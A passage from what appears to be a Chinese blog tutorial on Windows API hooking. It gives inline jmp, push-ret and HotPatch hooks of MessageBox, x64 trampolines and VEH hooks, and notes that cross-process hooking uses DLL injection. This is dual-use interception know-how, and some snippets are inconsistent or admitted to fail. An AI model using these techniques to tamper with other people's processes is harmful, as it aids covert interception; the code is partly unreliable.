class="line">&#125;</div></pre></td></tr></table></figure><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第二歩是构造TrampolineFun函数，Trampoline函数是用于在Detour回调Target函数，在使用Trampoline首先执行Target被修改的三条指令，为了避免调用Target函数堆栈异常。然后使用jmp的方式跳转到Target函数中第四条指令，绕过被修改的指令，<strong>这是为了实现永久化</strong><br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">//77D5050B &gt;  8BFF                   <span class="keyword">mov</span> <span class="built_in">edi</span>,<span class="built_in">edi</span></div><div class="line">//77D5050D    <span class="number">55</span>                     <span class="keyword">push</span> <span class="built_in">ebp</span></div><div class="line">//77D5050E    8BEC                   <span class="keyword">mov</span> <span class="built_in">ebp</span>,<span class="built_in">esp</span></div><div class="line">/////////////</div><div class="line">__declspec( naked )</div><div class="line"><span class="keyword">int</span> WINAPI OriginalMessageBox(HWND hWnd, LPCTSTR lpText, LPCTSTR lpCaption, UINT uType)</div><div class="line">&#123;</div><div class="line">_asm</div><div class="line">&#123;</div><div class="line">//再次执行之前被修改的三条指令，避免堆栈异常</div><div class="line"><span class="keyword">mov</span> <span class="built_in">edi</span>,<span class="built_in">edi</span></div><div class="line"><span class="keyword">push</span> <span class="built_in">ebp</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">ebp</span>,<span class="built_in">esp</span></div><div class="line"><span class="keyword">jmp</span> MsgBoxHookData.JmpBackAddr  //跳转到Hook之后的地方，跳过自己安装的HOOK,实现持续化</div><div class="line">&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在正式HOOK开始，还需要填充一些关键的参数，为此，我们构造一个结构体。以便管理参数。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">HOOK_DATA</span></span></div><div class="line"><span class="class">&#123;</span></div><div class="line"><span class="keyword">char</span> szApiName[<span class="number">128</span>];   <span class="comment">//TargetFun</span></div><div class="line"><span class="keyword">char</span> szModuleName[<span class="number">64</span>]; <span class="comment">//TargetModule</span></div><div class="line"><span class="keyword">int</span> HookCodelen;       <span class="comment">//HOOK长度</span></div><div class="line">BYTE oleEntry[<span class="number">16</span>];     <span class="comment">//保存HOOK原始指令</span></div><div class="line">BYTE newEntry[<span class="number">16</span>];     <span class="comment">//保存HOOK新指令</span></div><div class="line">ULONG_PTR HookPoint;   <span class="comment">//被HOOK的地址</span></div><div class="line">ULONG_PTR JmpBackAddr; <span class="comment">//回跳的地址，可以多次使用</span></div><div class="line">ULONG_PTR pfnTrampolineFun;    <span class="comment">//跳转到原函数执行的函数</span></div><div class="line">ULONG_PTR pfnDetourFun;   <span class="comment">//Detour函数</span></div><div class="line">&#125;HOOK_DATA,*PHOOK_DATA;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第三步是获取HookPoint和pfnTrampolineFun的地址，<strong>这一步的目的我也不是很清楚，但是我删除这两个指令，程序也是正常的。</strong>,接着设置回调点，这是为了在TrampolineFun中，设置跳转。<strong>回调点为了被修改指令之后</strong><br><figure class="highlight xl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//如果是跳转指令，获取跳转指令跟随的地址</span></div><div class="line"><span class="comment">//如果不是跳转指令，直接返回参数</span></div><div class="line"><span class="function"><span class="title">pHookData</span>-&gt;</span><span class="function"><span class="title">pfnTrampolineFun</span> = SkipJmpAddress(pHookData-&gt;</span>pfnTrampolineFun);</div><div class="line"><span class="comment">//HOOK点，是mov指令</span></div><div class="line"><span class="function"><span class="title">pHookData</span>-&gt;</span>H<span class="function"><span class="title">ookPoint</span> = SkipJmpAddress(pHookData-&gt;</span>HookPoint);</div><div class="line"><span class="function"><span class="title">pHookData</span>-&gt;</span>J<span class="function"><span class="title">mpBackAddr</span> = pHookData-&gt;</span>H<span class="function"><span class="title">ookPoint</span> + pHookData-&gt;</span>HookCodelen;</div><div class="line">ULONG_PTR SkipJmpAddress(ULONG_PTR uAddress)</div><div class="line">&#123;</div><div class="line">·······</div><div class="line"><span class="keyword">if</span> (pFn[<span class="number">0</span>] == <span class="number">0</span>xE9)</div><div class="line">&#123;</div><div class="line"><span class="comment">//目标地址-当前地址-5 = 偏移量</span></div><div class="line"><span class="comment">//(ULONG_PTR)pFn为当前地址</span></div><div class="line"><span class="comment">//*(ULONG_PTR*)(pFn + 1)为偏移量</span></div><div class="line">TrueAddress = (ULONG_PTR)pFn + *(ULONG_PTR*)(pFn + <span class="number">1</span>) + <span class="number">5</span>;</div><div class="line">return TrueAddress;</div><div class="line">&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第四步是填充我们修改的指令<br><figure class="highlight xl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//填充需要修改的内容</span></div><div class="line"><span class="function"><span class="title">pHookData</span>-&gt;</span>newEntry[<span class="number">0</span>] = <span class="number">0</span>xE9;    <span class="comment">//jmp</span></div><div class="line">*(ULONG*)(<span class="function"><span class="title">pHookData</span>-&gt;</span><span class="function"><span class="title">newEntry</span> + 1) = (ULONG)pHookData-&gt;</span><span class="function"><span class="title">pfnDetourFun</span> - (ULONG)pHookData-&gt;</span>HookPoint - <span class="number">5</span>;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第五步：使用ReadProcessMemory保存原指令以便恢复HOOK<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//保存原始数据到pHookData-&gt;oldEntry</span></div><div class="line"><span class="keyword">if</span> (!ReadProcessMemory(hProcess, (LPCVOID)pHookData-&gt;HookPoint, pHookData-&gt;oleEntry, pHookData-&gt;HookCodelen, &amp;dwBtyeReturned))</div><div class="line">&#123;</div><div class="line">printf(<span class="string">"[*]ReadProcessMemory:%d\n"</span>, GetLastError());</div><div class="line"><span class="keyword">return</span> <span class="keyword">FALSE</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第六步：使用WriteProcessMemory修改前三条指令<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (!WriteProcessMemory(hProcess, (LPVOID)pHookData-&gt;HookPoint, pHookData-&gt;newEntry, pHookData-&gt;HookCodelen, &amp;dwBtyeReturned))</div><div class="line">&#123;</div><div class="line">printf(<span class="string">"[*]WriteProcessMemory:%d\n"</span>, GetLastError());</div><div class="line"><span class="keyword">return</span> <span class="keyword">FALSE</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>题外话：</strong>例程中给的是当前进程HOOK，如果是需要跨进程的话，需要将InlineHook包装成dll，然后使用注入技术注入到目标进程，才能实现HOOK。</p><h2 id="0x2-3-InlineHook-C"><a href="#0x2-3-InlineHook-C" class="headerlink" title="0x2.3 InlineHook(C)"></a>0x2.3 InlineHook(C)</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在InlineHook(B)中，我们使用jmp指令跳转到Detour函数，这部分我们使用mov-jmp和push-ret，以及HotPatch的方法跳转到DetourFun。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先将跳转分为两种，第一种是一次性跳转，例如jmp，push-retn.mov-jmp等，第二种是HotPatch这种长短跳。对于第一种跳转比较简单，根据Hook的指令不同，可以选择长度为5.6.7不同的Hook指令。象jmp指令对应的是修改5个字节，而push-ret修改6个字节，mov-jmp修改的是七个字节。具体填充到HookPoint的数据如下：<br><figure class="highlight xl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//jmp （5个字节）</span></div><div class="line">M<span class="function"><span class="title">sgBoxHookData</span>-&gt;</span>newEntry[<span class="number">0</span>] = <span class="string">'\xE9'</span>;</div><div class="line">*(ULONG_PTR*)(M<span class="function"><span class="title">sgBoxHookData</span>-&gt;</span><span class="function"><span class="title">newEntry</span> + 1) = (ULONG_PTR)MsgBoxHookData-&gt;</span><span class="function"><span class="title">pfnDetourFun</span> - (ULONG_PTR)MsgBoxHookData-&gt;</span>HookPoint - <span class="number">5</span>;</div><div class="line"><span class="comment">//</span></div><div class="line"><span class="comment">//push-retn  (6个字节)</span></div><div class="line"><span class="function"><span class="title">memcpy</span>(MsgBoxHookData-&gt;</span>newEntry, <span class="string">"\x68\x44\x33\x22\x11\xC3"</span>,<span class="number">5</span>);</div><div class="line">*(LONG_PTR*)(M<span class="function"><span class="title">sgBoxHookData</span>-&gt;</span><span class="function"><span class="title">newEntry</span> + 1) = (ULONG)MsgBoxHookData-&gt;</span>pfnDetourFun;</div><div class="line"><span class="comment">//</span></div><div class="line"><span class="comment">//mov-jmp (7个字节)</span></div><div class="line"><span class="function"><span class="title">memcpy</span>(MsgBoxHookData-&gt;</span>newEntry, <span class="string">"\xB8\x44\x33\x22\x11\xFF\xE0 "</span>, <span class="number">7</span>);</div><div class="line">*(LONG_PTR*)(M<span class="function"><span class="title">sgBoxHookData</span>-&gt;</span><span class="function"><span class="title">newEntry</span> + 1) = (ULONG)MsgBoxHookData-&gt;</span>pfnDetourFun;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第二种跳转是长短跳，也就是HotPatch的方法，由于标准函数调用存在两种形式，分别是不存在SEH，和存在SEH的。对于第二种12个字节指令，我们推荐使用Hotpatch的方法，原理如下：因为在API上面存在nop或者int3，这些指令通常是微软用于实现HotPatch的。可以使用长短跳结合的方式占用上方的nop实现Hook，步骤是这样的：1.使用短跳到HookPoint上面5个字节HotPatchCode处， 2.然后使用长跳到DetourFun。<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">//<span class="number">1</span>.不存在SEH</div><div class="line"><span class="keyword">mov</span> <span class="built_in">edi</span>,<span class="built_in">edi</span></div><div class="line"><span class="keyword">push</span> <span class="built_in">ebp</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">ebp</span>,<span class="built_in">esp</span>（<span class="number">5</span>个字节）</div><div class="line">//<span class="number">2</span>.存在SEH</div><div class="line"><span class="keyword">push</span> <span class="number">10</span></div><div class="line"><span class="keyword">push</span> xxxx</div><div class="line"><span class="keyword">call</span> xxx（<span class="number">2</span>+<span class="number">5</span>+<span class="number">5</span>）</div></pre></td></tr></table></figure></p><figure class="highlight xl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//77D507E5   &gt;-/E9 66086B88      jmp InlineHo.00401050</span></div><div class="line"><span class="comment">//77D507EA &gt; $^\EB F9            jmp short USER32.77D507E5</span></div><div class="line"><span class="comment">//</span></div><div class="line">M<span class="function"><span class="title">sgBoxHookData</span>-&gt;</span>newEntry[<span class="number">0</span>] = <span class="number">0</span>xEB; <span class="comment">//Jmp -5</span></div><div class="line">M<span class="function"><span class="title">sgBoxHookData</span>-&gt;</span>newEntry[<span class="number">1</span>] = <span class="number">0</span>xF9;</div><div class="line">M<span class="function"><span class="title">sgBoxHookData</span>-&gt;</span>HotPatchCode[<span class="number">0</span>] = <span class="number">0</span>xE9; <span class="comment">//Jmp</span></div><div class="line">*(ULONG*)(M<span class="function"><span class="title">sgBoxHookData</span>-&gt;</span>H<span class="function"><span class="title">otPatchCode</span> + 1) = (ULONG)MsgBoxHookData-&gt;</span><span class="function"><span class="title">pfnDetourFun</span> - ((ULONG)MsgBoxHookData-&gt;</span>HookPoint - <span class="number">5</span>) - <span class="number">5</span>;</div></pre></td></tr></table></figure><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;InlineHook(C)属于InlineHook(B)的进阶版。所以基本步骤也是相同的。</p><ul><li>Step1：构造Detour函数和TrampolineFun</li><li>Step2：获取Detour和HookPoint的地址。</li><li>Step3：修改TrampolineFun处初始化的原指令</li><li>Step4：填充需要修改的指令</li><li>Step5：使用ReadProcessMemory保存原指令</li><li>Step5：使用WriteProcessMemory修改Target函数指令</li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;构造Detour函数和构造TrampolineFun函数，以及填充修改的指令和之前是一致的，第三步是保存原始数据，这样做是为了以后能够将头几条指令填充TrampolineFun<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//Step3 保存原始数据</span></div><div class="line"><span class="comment">//jmp mov-jmp，push-ret三种方法和HotPatch大有不同，分开讨论</span></div><div class="line">SIZE_T lpNumberOfBytesRead = <span class="number">0</span>;</div><div class="line"><span class="keyword">if</span> (!ReadProcessMemory(GetCurrentProcess(), (LPCVOID)MsgBoxHookData-&gt;HookPoint, MsgBoxHookData-&gt;oldEntry, <span class="number">8</span>, &amp;lpNumberOfBytesRead))</div><div class="line">&#123;</div><div class="line">printf(<span class="string">"[*]ReadProcessMemory:%d"</span>, GetLastError());</div><div class="line"><span class="keyword">return</span> <span class="keyword">FALSE</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第四步填充TrampolineFun函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (MsgBoxHookData-&gt;HookCodeLen != <span class="number">2</span>)</div><div class="line">&#123;</div><div class="line">SIZE_T lpNumberOfBytesWrite = <span class="number">0</span>;</div><div class="line"><span class="keyword">if</span> (!WriteProcessMemory(GetCurrentProcess(), (LPVOID)MsgBoxHookData-&gt;pfnTrampolineFun, MsgBoxHookData-&gt;oldEntry, MsgBoxHookData-&gt;HookCodeLen, &amp;lpNumberOfBytesWrite))</div><div class="line">&#123;</div><div class="line">printf(<span class="string">"[*]WriteProcessMemory:%d"</span>, GetLastError());</div><div class="line"><span class="keyword">return</span> <span class="keyword">FALSE</span>;</div><div class="line">&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第五步是向向HookPoint写入跳转数据，对于一次性跳转和之前是一致的，不再说明，重点是HotPatch。根据原理，在HookPaint处写入<code>\xE8\xF9</code>是跳转到EIP-5处也就是HotPatch处。可以在HookPoint前5个指令写入Hotpatch用于跳转到Detourfun，<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//一次性跳转</span></div><div class="line">pAddrToWrite = (PBYTE)MsgBoxHookData-&gt;HookPoint;</div><div class="line"><span class="keyword">if</span> (!WriteProcessMemory(GetCurrentProcess(), pAddrToWrite, MsgBoxHookData-&gt;newEntry, MsgBoxHookData-&gt;HookCodeLen, &amp;lpNumberOfBytesWrite))</div><div class="line">&#123;</div><div class="line">printf(<span class="string">"[*]WriteProcessMemory:%d"</span>, GetLastError());</div><div class="line"><span class="keyword">return</span> <span class="keyword">FALSE</span>;</div><div class="line">&#125;</div><div class="line"><span class="comment">//</span></div><div class="line"><span class="comment">//[重点]HotPatch</span></div><div class="line"><span class="keyword">if</span> (MsgBoxHookData-&gt;HookCodeLen == <span class="number">2</span>)   <span class="comment">//[重点]HotPatch</span></div><div class="line">&#123;</div><div class="line">pAddrToWrite = (PBYTE)MsgBoxHookData-&gt;HookPoint - <span class="number">5</span>;</div><div class="line"><span class="keyword">if</span> (!WriteProcessMemory(GetCurrentProcess(), pAddrToWrite, MsgBoxHookData-&gt;HotPatchCode, <span class="number">5</span>, &amp;lpNumberOfBytesWrite))</div><div class="line">&#123;</div><div class="line">printf(<span class="string">"[*]WriteProcessMemory:%d"</span>, GetLastError());</div><div class="line"><span class="keyword">return</span> <span class="keyword">FALSE</span>;</div><div class="line">&#125;</div><div class="line"><span class="comment">//达到需要写入的地址</span></div><div class="line">pAddrToWrite += <span class="number">5</span>;</div><div class="line"><span class="keyword">if</span> (!WriteProcessMemory(GetCurrentProcess(), pAddrToWrite, MsgBoxHookData-&gt;newEntry, MsgBoxHookData-&gt;HookCodeLen, &amp;lpNumberOfBytesWrite))</div><div class="line">&#123;</div><div class="line">printf(<span class="string">"[*]WriteProcessMemory:%d"</span>, GetLastError());</div><div class="line"><span class="keyword">return</span> <span class="keyword">FALSE</span>;</div><div class="line">&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><h2 id="0x2-4-InlineHook-D-x64"><a href="#0x2-4-InlineHook-D-x64" class="headerlink" title="0x2.4 InlineHook(D)(x64)"></a>0x2.4 InlineHook(D)(x64)</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这一节主要讲x64下面的HOOK技术，和之前的x86下HOOK一样，都需要经历一下步骤：这一部分主要讲一下在X64位下面HOOK需要注意的地方。</p><ul><li>Step1：构造Detour函数</li><li>Step2：获取Detour和HookPoint的地址。</li><li>Step3：修改TrampolineFun处初始化的原指令</li><li>Step4：填充需要修改的指令</li><li>Step5：使用ReadProcessMemory保存原指令</li><li>Step5：使用WriteProcessMemory修改Target函数指令</li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第一点，就是在X86下可以直接写入一段shellcode到TrampolineFun。但是在x64下不能内联汇编了，所以申请一块内存用做TrampolineFun的shellcode。然后使用才能填充Trampoline。<strong>但是教主给的例程使用第二段代码做重定位，不知道作用是什么，但是使用这段代码在WIN10下HOOK MessageBoxA是不正确的，可能是填充Trampoline出现了意外。或者在填写跳转地址的时候少了一个字节，跳到了在正常的代码上面的一个int 3处，导致异常。</strong><br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">MsgBoxHookData.pfnTrampolineFun = (ULONG_PTR)VirtualAlloc(NULL, <span class="number">128</span>, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</div><div class="line"><span class="comment">//...</span></div><div class="line">PBYTE pFun = (PBYTE)pHookData-&gt;pfnTrampolineFun;</div><div class="line">memcpy(pFun, (PVOID)(pHookData-&gt;HookPoint), <span class="number">14</span>);</div><div class="line">pFun += <span class="number">14</span>;</div><div class="line">pFun[<span class="number">0</span>] =<span class="number">0xFF</span>;</div><div class="line">pFun[<span class="number">1</span>] = <span class="number">0x25</span>;</div><div class="line">*(ULONG_PTR*)(pFun + <span class="number">6</span>) = pHookData-&gt;JmpBackAddr;</div></pre></td></tr></table></figure></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="regexp">//</span>由于第三行指令中有重定位数据，所以这里需要修复一下</div><div class="line"><span class="regexp">//</span>更好的办法是使用反汇编引擎来判断是否有重定位数据</div><div class="line"><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span></div><div class="line"><span class="regexp">//</span>                   不懂                            <span class="regexp">//</span></div><div class="line"><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span></div><div class="line">ULONG DataOffset = <span class="number">0</span>;</div><div class="line">ULONG_PTR pData = (ULONG_PTR)pHookData-&gt;HookPoint + <span class="number">7</span> + <span class="number">7</span> + *(ULONG*)(pHookData-&gt;HookPoint + <span class="number">10</span>);</div><div class="line">printf(<span class="string">"pData = 0x%p\n"</span>, pData);</div><div class="line">DataOffset = (ULONG)(pData - ((ULONG_PTR)pFun + <span class="number">14</span>));</div><div class="line">*(ULONG*)(pFun + <span class="number">10</span>) = DataOffset;</div></pre></td></tr></table></figure><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第二点，就是在X86下面，修改指令的长度最大是7个字节，在X64下变成了14个字节，而且地址长度变成了8个字节。并且使用的指令E9变成了FF25这种长跳转指令。<br><figure class="highlight xl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//64位jmp</span></div><div class="line"><span class="function"><span class="title">memset</span>(pHookData-&gt;</span>newEntry, <span class="number">0</span>, <span class="number">14</span>);</div><div class="line"><span class="function"><span class="title">pHookData</span>-&gt;</span>newEntry[<span class="number">0</span>] = <span class="number">0</span>xFF;</div><div class="line"><span class="function"><span class="title">pHookData</span>-&gt;</span>newEntry[<span class="number">1</span>] = <span class="number">0</span>x25;</div><div class="line"><span class="comment">//2-5是全0</span></div><div class="line">*(ULONG_PTR*)(<span class="function"><span class="title">pHookData</span>-&gt;</span><span class="function"><span class="title">newEntry</span> + 6) = (ULONG_PTR)pHookData-&gt;</span>pfnDetourFun;</div></pre></td></tr></table></figure></p><h1 id="0x3-VEH-HOOK"><a href="#0x3-VEH-HOOK" class="headerlink" title="0x3 VEH_HOOK"></a>0x3 VEH_HOOK</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;VEH技术的主要原理是利用异常处理改变程序指令流程。通过主动抛出异常，使程序触发异常，控制权交给异常处理例程的这一系列操作来实现HOOK。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这里简单提一下VEH，向量异常处理，基于VEH链表而不是栈，这样的话其作用范围是进程全局，而不是线程。且优先级也高于SEH，这也是VEH_HOOK的优势所在。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; VEH_HOOK通过异常机制实现HOOK，必不可少需要构造异常处理函数，同时也需要人为的构造异常，同时为了实现永久化机制，保证执行原操作需要实现TrampolineFun函数。所以总结VEH_HOOK步骤如下：</p><ul><li>1.构造TrampolineFun</li><li>2.构造异常处理函数，即Detour函数</li><li>3.人为构造异常。</li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 构造TrampolineFun的目的1是为了执行原有流程，2是实现永久化。因为64位不支持内联汇编，所以需要开辟空间来存放shellcode。复制前四个指令，实现堆栈平衡，然后为了永久化，特定将跳转点定在函数开头后四个字节处。<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">pFun = (PBYTE)VirtualAlloc(NULL, <span class="number">128</span>, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</div><div class="line">uResult = (ULONG_PTR)pFun;</div><div class="line">if (NULL == pFun)</div><div class="line">&#123;</div><div class="line">printf(<span class="string">"VirtualAlloc%d<span class="subst">\n</span>"</span>, GetLastError());</div><div class="line">return NULL;</div><div class="line">&#125;</div><div class="line"><span class="comment">//</span></div><div class="line">memset(pFun, <span class="number">0</span>, <span class="number">128</span>);</div><div class="line">memcpy(pFun, g_AddressOfMsgBox, <span class="number">4</span>);   <span class="comment">//复制MsgBox前四个字节</span></div><div class="line">pFun += <span class="number">4</span>;</div><div class="line">pFun[<span class="number">0</span>] = <span class="number">0xFF</span>;</div><div class="line">pFun[<span class="number">1</span>] = <span class="number">0x25</span>;</div><div class="line">*(ULONG_PTR*)(pFun + <span class="number">6</span>) = (ULONG_PTR)g_AddressOfMsgBox + <span class="number">4</span>;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;构造异常处理函数，这个函数就是Detour函数，同时也是我们异常处理的函数，所以他的参数是一个_EXCEPTION_POINTERS结构。根据看雪加密解密所介绍，他是一个陷进帧，用来存放EXCEPTION_RECORD和 CONTEXT_RECORD。EXCEPTION_RECORD保存发生异常的基本信息，<strong>如异常类型，发生异常的地址</strong>。而二是CONTEXT_RECORD用于保存上下文。<br><figure class="highlight xl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">LONG WINAPI VectoredHandler1(struct _EXCEPTION_POINTERS *ExceptionInfo)</div><div class="line">&#123;</div><div class="line"><span class="comment">//初始化异常信息</span></div><div class="line"><span class="function"><span class="title">pExceptionRecord</span> = ExceptionInfo-&gt;</span>ExceptionRecord;</div><div class="line"><span class="function"><span class="title">pContextRecord</span> = ExceptionInfo-&gt;</span>ContextRecord;</div><div class="line"><span class="comment">//如果异常发生在Msgbox，且异常原因是断点异常。</span></div><div class="line"><span class="function"><span class="title">if</span> (pExceptionRecord-&gt;</span>ExceptionAddress == g_AddressOfMsgBox</div><div class="line">&amp;&amp; <span class="function"><span class="title">pExceptionRecord</span>-&gt;</span>ExceptionCode == EXCEPTION_BREAKPOINT)</div><div class="line">&#123;</div><div class="line"><span class="comment">//此处执行你想要的操作。</span></div><div class="line">&#125;</div><div 